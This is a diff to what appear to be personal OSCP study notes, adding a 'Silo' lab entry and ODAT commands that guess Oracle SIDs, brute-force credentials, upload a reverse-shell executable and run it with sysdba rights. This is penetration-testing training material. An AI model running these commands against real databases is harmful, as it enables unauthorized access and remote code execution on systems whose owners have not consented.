@@ -84,6 +84,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Optimum | HttpFileServer 2.3 | MS16-098 ||
 | Remote | NFS Service(default port 2049), mount, sdf, Umbraco CMS | SeImpersonatePrivilege, TeamViewer |
 | SecNotes | CSRF reset password link, smb, IIS php | WinPEAS Linux shells/distributions ||
+| Silo | Oracle, CVE-2012-1675, ODAT, brute-force | Oracle, SYSTEM Privilege ||
 
 (*):review before the exam
 
@@ -381,4 +382,19 @@ NFS Service
 showmount -e <target ip>
 mkdir /tmp/test_folder
 sudo mount -t nfs <target ip>:/<folder> /tmp/test_folder -o nolock
+```
+
+Used in ```Silo```
+
+[ODAT(Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
+
+```shell
+# searching valid SIDs
+python3 odat.py sidguesser -s <target ip> --sids-file=./resources/sids.txt
+# using default list (accounts/accounts.txt) to execute brute-force attacks
+python3 odat.py passwordguesser -s <target ip> -d <sid> -vvv
+# upload reverse shell payload 
+python3 odat.py utlfile -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --putFile c:/ shell-x64.exe /tmp/shell-x64.exe
+# execute reverse shell payload
+python3 odat.py externaltable -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --exec c:/ shell-x64.exe
 ```
